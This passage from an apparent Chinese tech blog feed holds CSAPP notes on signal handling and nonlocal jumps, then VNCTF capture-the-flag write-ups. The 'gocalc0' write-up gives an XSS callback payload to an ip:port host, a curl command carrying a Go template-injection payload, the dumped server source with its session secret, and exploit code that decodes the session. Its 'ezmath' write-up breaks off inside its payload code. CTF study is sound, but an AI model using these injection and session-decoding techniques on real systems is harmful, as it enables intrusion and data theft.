~set)</li><li>SIG_SETMASK：blocked=set，用于恢复阻塞信号集</li></ul><p>如果oldset参数位置不为NULL，那么blocked位向量改变前的值会保存在oldset中。</p><h2 id="编写信号处理程序"><a href="#编写信号处理程序" class="headerlink" title="编写信号处理程序"></a>编写信号处理程序</h2><p>信号处理是很复杂的一个问题，稍微不小心可能就会出现错误。这样的原因有信号处理程序与主程序并发运行共享相同的全局变量，信号处理程序可能被其他信号打断，什么时候接收信号最合适等。这节从安全、正确和可移植三方面来介绍了如何编写信号处理程序。</p><h3 id="安全的信号处理"><a href="#安全的信号处理" class="headerlink" title="安全的信号处理"></a>安全的信号处理</h3><p>这里介绍的是一些保守的编写处理程序的原则，如果忽视这些原则，那么很有可能引入细微的并发错误，而这些错误一旦发生往往是不可预测和不可重复的。</p><ul><li>G0.处理程序要尽可能简单。</li><li>G1.在处理程序中只调用异步信号安全的函数。原因：可重入（如只访问局部变量）；不能被信号处理程序中断。Linux中有保证安全的系统级函数（详细见书籍），要注意的是许多常见的函数如exit和printf等均不在此列。</li><li>G2.保存和恢复errno。许多Linux异步信号安全的函数在出错返回时会设置errno。在处理程序中调用这样的函数可能会干扰主程序中其他依赖于errno的部分。解决办法是在进入处理程序时把errno存入一个局部变量中，并在处理程序返回前恢复errno。只有<strong>在处理程序返回时</strong>才有此必要，如果处理程序调用_exit终止该进程那么就不需要此步骤。</li><li>G3.阻塞所有的信号，来保护对共享全局数据结构的访问。如果处理程序、主程序和其他处理程序共享一个全局数据结构，那么在访问该数据结构前应该阻塞所有的信号，这样可以保证数据的一致性。</li><li>G4.用<code>volatile</code>限定符来声明全局变量。该限定符的作用是告诉编译器不要缓存该变量，每次都要存内存中读取。</li><li>G5.用<code>sig_atomic_t</code>声明标志。在常见的处理程序中，处理程序会设置全局标志位来记录收到了信号。主程序周期的读这个标志，响应信号，再清除该标志。C提供了sig_atomic_t数据类型，来保证对它的读和写是原子操作，这样就可以避免阻塞信号。<strong>注意</strong>，对原子性的保证只适用于单个的读和写，不适用于需要多条指令flag++和flag=flag+1这样的更新。</li></ul><h3 id="正确的信号处理"><a href="#正确的信号处理" class="headerlink" title="正确的信号处理"></a>正确的信号处理</h3><p>之前已经介绍过了，未处理的信号是不会排队等待的。因为pending位向量中每个信号只占一位，所以每个信号类型最多只能有一个未处理的信号。如果两个类型k的信号发送给一个目的进程，那么只有一个信号会被接收，另一个会被简单地丢弃掉。关键的思想是，如果存在一个未处理的信号，则表明<strong>至少</strong>有一个信号到达了。<br>错误情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数 回收所有子进程</span></span><br><span class="line">...</span><br><span class="line">signal(SIGCHLD, handler1);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// handler1函数</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* 肯定会出错 不建议这么写 */</span></span><br><span class="line">waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 修正后代码 */</span></span><br><span class="line"><span class="keyword">while</span> (waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 回收后的操作</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>上面代码错误的情况是因为认为每次只有一个信号发出，而不是每次至少一个信号发出。前一种情况如果当前处理程序正在处理信号，此时另一个信号到达那么这个信号会加入待处理信号的集合（隐式阻塞），这时又一个相同的信号到达后会被直接的丢弃，也就导致了最后只能回收两个子进程，另一个会变为僵尸进程。<br>解决办法是调用一次信号处理程序应尽可能多的回收子进程</p><h3 id="可移植的信号处理"><a href="#可移植的信号处理" class="headerlink" title="可移植的信号处理"></a>可移植的信号处理</h3><p>不同的Unix系统有不同的信号处理语义。</p><ul><li>signal函数的语义各有不同</li><li>系统调用可以被中断</li><li>…</li></ul><p>Posix标准定义了sigaction函数，可以让用户明确的指定信号处理语义，但是由于其参数设置过为复杂，所以很少使用。更多的是使用一种包装函数<code>Signal</code>。详细介绍见书籍8.5.5</p><h2 id="同步流避免并发错误"><a href="#同步流避免并发错误" class="headerlink" title="同步流避免并发错误"></a>同步流避免并发错误</h2><p>如何编写读写相同存储位置的并发流程序困扰着一代又一代的计算机科学家，流可能交错的数量与指令的数量呈指数关系，这些交错的流有些会产生正确的结果，有的确不会。要解决的基本问题是以某种方式同步并发流，来得到最大的可行的交错的并发流集合，使每个可行的交错得到正确的结果。<br>同步流竞争例子可以参考书籍8.5.6。</p><h2 id="显示地等待信号"><a href="#显示地等待信号" class="headerlink" title="显示地等待信号"></a>显示地等待信号</h2><p>上面的例子都没有显示等待信号的代码部分，也就是程序没有“刻意”地等待一个信号的到来。比如shell创建一个前台作业，在该前台作业结束前，shell必须等待其被SIGCHLD处理程序回收。<br>一个简单的方法是设置一个全局PID变量初始值为0，然后在前台作业结束前循环等待，处理程序回收前台作业后设置全局pid，这时再执行之后的操作。<br>为了避免循环浪费资源，可以使用<code>pause</code>函数让主进程休眠。可是这样会存在一个竞争条件，如果前台作业在while语句之后pause语句之前结束运行并返回一个SIGCHLD信号，主进程会进入一个永远的休眠状态。为了避免这种情况另外一种方法是使用sleep函数，规定进程的休眠时间，但这样很难把握时间的范围，所以就引入了<code>sigsuspend</code>这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigsuspend</span><span class="params">(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *mask)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数暂时用mask替换当前的阻塞集合，然后挂起该进程，直到收到一个信号。该函数等价于下述代码的原子版本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h1 id="Nonlocal-jump-非本地跳转"><a href="#Nonlocal-jump-非本地跳转" class="headerlink" title="Nonlocal jump(非本地跳转)"></a>Nonlocal jump(非本地跳转)</h1><p>C语言提供了一种用户级异常控制流的形式，称为非本地跳转，它将控制直接从一个函数转到另一个函数，而不需要正常的调用-返回序列。非本地跳转是通过setjmp和longjmp函数来提供的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setjmp</span><span class="params">(jmp_buf env)</span></span>; <span class="comment">/* setjmp调用返回0 longjmp掉用返回错误类型值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="keyword">int</span> savesigs)</span></span>;</span><br></pre></td></tr></table></figure><p>setjmp函数在env缓冲区中保存当前调用环境，来供后面的longjmp使用，并返回0。调用环境包括程序计数器、栈指针和通用目的寄存器，其返回值不能赋值给变量，但可以用在switch和条件语句的测试中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">longjmp</span><span class="params">(jmp_buf env, <span class="keyword">int</span> retval)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="keyword">int</span> retval)</span></span>;</span><br></pre></td></tr></table></figure><p>longjmp函数从env缓冲区中恢复调用环境，然后触发一个从最近一次初始化env的setjmp调用的返回，然后<strong>setjmp返回并带有非零的返回值retval</strong>。<br>setjmp函数只被调用一次但返回多次，longjmp函数被调用一次但从不返回。非本地跳转的一个重要应用就是允许一个从深层嵌套的函数中立即返回，这样当发生错误情况时，我们可以使用非本地跳转直接返回到一个普通的本地化错误处理程序，而不需要再费力地解开调用栈。<br>longjmp函数虽然可以直接跳过中间调用的特性，但这样可能出现意外的后果。比如，中间调用创建了很多数据结构，本来应该在函数结束时释放它们却直接的跳过了，这样会产生内存的泄露。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章是对书籍和官方PPT知识点的总结，适合用来复习。如果想系统深入地学习，推荐看官方书籍。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> CSAPP </category>
          
          <category> ECF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程概念 </tag>
            
            <tag> 信号机制 </tag>
            
            <tag> 异常 </tag>
            
            <tag> 条件竞争 </tag>
            
            <tag> 非本地跳转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-gocalc0</title>
      <link href="/2022/02/21/VNCTF-gocalc0/"/>
      <url>/2022/02/21/VNCTF-gocalc0/</url>
      
        <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><img src="https://s2.loli.net/2022/02/21/y8OVRmStGafujQB.png" alt="image.png"><br>提示flag在session中，查看session。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=MTY0NTQ1MDk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN1kySmpOVE0yT1RndFpUa3pOUzAwWVRobUxUZ3haR0l0TTJSbE1UWTRZelJsT0RnMGZRPT18MA98tCAhu-p8jMhdTC59dwpXrTrohp0y-hpxBw5pmI0=</span><br></pre></td></tr></table></figure><p>尝试进行base64解码失败，只能测试一下主界面的计算器了。<br>可疑点是之前输入的内容和结果不会随着刷新而消失，查看session发现长度增长了，那么可能是将结果存储到session中了，可是session没有内容固定的部分而是随着内容变化，所以只能再找其他的点了。<br>在输入框输入JS脚本，发现存在XSS，那就试着反弹一下。<br><code>&lt;img src=http://ip:port&gt;</code><br>然后在自己的本地监听一下，看看能不能收到请求。<br><img src="https://s2.loli.net/2022/02/21/9FBSwrWqXPHvojK.png" alt="image.png"><br>这个只是自己本地XSS，没啥太大用处。<br>输入111后发现只显示111，那确定这个网站存在模板渲染。看题目的名字中有go，那肯定是go的SSTI模板渲染了。</p><h1 id="获取源代码并分析"><a href="#获取源代码并分析" class="headerlink" title="获取源代码并分析"></a>获取源代码并分析</h1><p>可以通过<code>&#123;&#123;.&#125;&#125;</code>获取到当前的作用域。<code>.</code>代表当前作用域的当前对象，类似于Java/c++中的this关键字。<br>保存文件到本地：<code>curl -X POST -d &#39;e=&#123;&#123;.&#125;&#125;&#39; http://76366c79-20e4-42de-88b9-142a07b55668.node4.buuoj.cn:81/ &gt; web</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        _ <span class="string">&quot;embed&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line">        <span class="string">&quot;reflect&quot;</span></span><br><span class="line">        <span class="string">&quot;strings&quot;</span></span><br><span class="line">        <span class="string">&quot;text/template&quot;</span> <span class="comment">/* 模板渲染 可能存在SSTI */</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">    <span class="comment">/* HTTP WEB 框架 */</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/maja42/goval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed template/index.html</span></span><br><span class="line"><span class="keyword">var</span> tpl <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed main.go</span></span><br><span class="line"><span class="keyword">var</span> source <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Eval <span class="keyword">struct</span> &#123;</span><br><span class="line">        E <span class="keyword">string</span> <span class="string">`json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数特征 结构体类型 函数名字和参数列表 返回类型</span></span><br><span class="line"><span class="comment">// 定义的是一个结构体方法 结构体可以调用该方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Eval)</span> <span class="title">Result</span><span class="params">()</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">        eval := goval.NewEvaluator()</span><br><span class="line">        result, err := eval.Evaluate(e.E, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        t := reflect.ValueOf(result).Type().Kind()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> t == reflect.Int &#123;</span><br><span class="line">                <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, result.(<span class="keyword">int</span>)), <span class="literal">nil</span></span><br><span class="line">    <span class="comment">/* 可以返回字符串类型 */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> t == reflect.String &#123;</span><br><span class="line">                <span class="keyword">return</span> result.(<span class="keyword">string</span>), <span class="literal">nil</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;not valid type&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Eval)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">        res, err := e.Result()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                res = <span class="string">&quot;invalid&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%s = %s&quot;</span>, e.E, res)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">render</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> his <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session.Get(<span class="string">&quot;history&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">                his = <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                his = session.Get(<span class="string">&quot;history&quot;</span>).(<span class="keyword">string</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Println(strings.ReplaceAll(tpl, <span class="string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))</span><br><span class="line">        <span class="comment">/* 之前输入内容不丢失 */</span></span><br><span class="line">        t, err := template.New(<span class="string">&quot;index&quot;</span>).Parse(strings.ReplaceAll(tpl, <span class="string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                c.String(<span class="number">500</span>, <span class="string">&quot;internal error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* source全局变量保存着源代码 */</span></span><br><span class="line">        <span class="keyword">if</span> err := t.Execute(c.Writer, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">                <span class="string">&quot;s0uR3e&quot;</span>: source,</span><br><span class="line">        &#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        port := os.Getenv(<span class="string">&quot;PORT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> port == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                port = <span class="string">&quot;8080&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                render(c)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                session.Set(<span class="string">&quot;FLAG&quot;</span>, os.Getenv(<span class="string">&quot;FLAG&quot;</span>))</span><br><span class="line">                session.Save()</span><br><span class="line">                c.String(<span class="number">200</span>, <span class="string">&quot;flag is in your session&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.POST(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> his <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> session.Get(<span class="string">&quot;history&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">                        his = <span class="string">&quot;&quot;</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        his = session.Get(<span class="string">&quot;history&quot;</span>).(<span class="keyword">string</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                eval := Eval&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> err := c.ShouldBind(&amp;eval); err == <span class="literal">nil</span> &#123;</span><br><span class="line">                        his = his + eval.String() + <span class="string">&quot;&lt;br/&gt;&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">                session.Set(<span class="string">&quot;history&quot;</span>, his)</span><br><span class="line">                session.Save()</span><br><span class="line">                render(c)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.Run(fmt.Sprintf(<span class="string">&quot;:%s&quot;</span>, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码使用了<a href="https://github.com/gin-contrib/sessions#cookie-based">这个库</a>，参考官方教程我们可以使用Get函数获取session变量加密前的数值。题目这个代码在我们访问<code>/flag</code>这个页面后，将环境变量中的FLAG值设置为session中FLAG所对的值。所以我们可以直接在获取到包含FALG的session后用官方的库获取源数据。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>在自己本地或远程服务器上使用下面代码开启一个web服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">    <span class="comment">/* HTTP WEB 框架 */</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        port := os.Getenv(<span class="string">&quot;PORT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> port == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                port = <span class="string">&quot;18001&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                c.String(<span class="number">200</span>, session.Get(<span class="string">&quot;FLAG&quot;</span>).(<span class="keyword">string</span>))</span><br><span class="line">        &#125;)</span><br><span class="line">    r.Run(fmt.Sprintf(<span class="string">&quot;:%s&quot;</span>, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/22/ijE2xbUcsOodMC6.png" alt="image.png"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li><code>go mod tidy</code>无法识别依赖 <ul><li>解决办法，<strong>go源文件名字不能与mod的名字重复</strong></li></ul></li><li>go初始化变量使用<code>:=</code>，改变值使用<code>=</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> VNCTF </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-ezmath</title>
      <link href="/2022/02/19/VNCTF-ezmath/"/>
      <url>/2022/02/19/VNCTF-ezmath/</url>
      
        <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目给出了服务端的python源代码，先分析一下。</p><h2 id="条件一"><a href="#条件一" class="headerlink" title="条件一"></a>条件一</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">    proof = (<span class="string">&#x27;&#x27;</span>.join([random.choice(table)<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])).encode()</span><br><span class="line">    sha = sha256(proof).hexdigest()encode()</span><br><span class="line">    self.send(<span class="string">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class="number">4</span>:] + <span class="string">b&quot;) == &quot;</span> + sha )</span><br><span class="line">    XXXX = self.recv(prompt = <span class="string">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(XXXX) != <span class="number">4</span> <span class="keyword">or</span> sha256(XXXX + proof[<span class="number">4</span>:]).hexdigest().encode() != sha:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>首先是在生成的<code>table</code>表中随机选取了20个字符，然后进行了sha256编码。但是它最后的输出并没有给出源字符串的前4个字符，我们的任务是解出这4个字符。<br>sha256对相同的字符串会生成相同的哈希加密字符串，服务器已经发送给我们哈希加密后的字符串，那么就可以针对这4个字符进行暴力破解。</p><h2 id="条件二"><a href="#条件二" class="headerlink" title="条件二"></a>条件二</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">times = getPrime(<span class="number">32</span>)</span><br><span class="line">self.send(<span class="string">b&#x27;plz give me the &#x27;</span> + <span class="built_in">str</span>(times).encode() + <span class="string">b&#x27;th (n) that satisfying (2^n-1) % 15 == 0:&#x27;</span>)</span><br></pre></td></tr></table></figure><p>条件二随机生成一个32位的素数<code>times</code>，然后要求我们找出满足该公式的第<code>times</code>个n的数值。<br>这其实是一个简单的数学问题，有规律可循，可参考这个<a href="https://zhidao.baidu.com/question/1576765037448550700.html">链接</a><br>最后我们需要满足条件二777次。</p><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 